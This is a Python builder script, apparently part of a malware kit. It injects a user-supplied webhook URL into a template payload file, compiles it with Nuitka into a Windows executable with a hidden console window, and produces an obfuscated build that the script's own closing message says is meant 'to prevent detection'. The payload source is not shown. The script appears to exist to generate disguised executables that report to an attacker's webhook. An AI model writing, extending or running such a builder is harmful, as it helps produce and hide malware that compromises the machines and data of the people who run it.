import os
import shutil
import subprocess
import sys


def main():
    webhook = input("Webhook: ").strip()
    outputfilename = input("Output filename (no extension): ").strip()

    if not webhook or not outputfilename:
        print("you gotta put the shit in the shit bro")
        sys.exit(1)

    base_dir = os.path.dirname(os.path.abspath(__file__))
    src_path = os.path.join(base_dir, "src.py")
    out_py = os.path.join(base_dir, f"{outputfilename}.py")

    if not os.path.isfile(src_path):
        print("src.py not found, make sure u didnt rename or move it")
        sys.exit(1)

    with open(src_path, "r", encoding="utf-8") as f:
        content = f.read()
    content = content.replace("WEBHOOK_URL", webhook)
    with open(out_py, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"Created {out_py} with webhook url injected")
    print(f"Starting nuitka exe compilation")

    # unobfuscated build
    subprocess.run(
        [
            "python", "-m", "nuitka",
            f"{outputfilename}.py",
            "--onefile",
            "--windows-console-mode=disable",
            "--remove-output",
            f"--output-filename={outputfilename}-UNOBFUSCATED",
        ],
        cwd=base_dir,
        check=True,
    )
    print(f"Compiled unobfuscated version (dont use ts btw)")
    print(f"Creating obfuscated version")

    # obfuscate
    subprocess.run(
        ["python", "crypt.py", "--nuitka", f"{outputfilename}.py"],
        cwd=base_dir,
        check=True,
    )
    print(f"Obfuscation finished")
    print(f"Starting nuitka exe compilation")

    # obfuscated build
    subprocess.run(
        [
            "python", "-m", "nuitka",
            f"{outputfilename}_obf.py",
            "--onefile",
            "--windows-console-mode=disable",
            "--remove-output",
            f"--output-filename={outputfilename}",
        ],
        cwd=base_dir,
        check=True,
    )
    print(f"Compiled obfuscated version")
    print(f"Checking outputs and moving all to folder")

    # Move all output files into a folder named outputfilename
    dest = os.path.join(base_dir, outputfilename)
    os.makedirs(dest, exist_ok=True)
    for file in [
        f"{outputfilename}.py",
        f"{outputfilename}_obf.py",
        f"{outputfilename}-UNOBFUSCATED.exe",
        f"{outputfilename}.exe",
    ]:
        path = os.path.join(base_dir, file)
        if os.path.exists(path):
            shutil.move(path, os.path.join(dest, file))
        else:
            print(f"{file} not found while checking outputs, ts aint good")

    print(f"done, check {dest}")
    print(f"P.S: the 'obfuscation' in question is actually pretty shitty at obfuscation, it is mostly to prevent detection - which is does well")


if __name__ == "__main__":
    main()
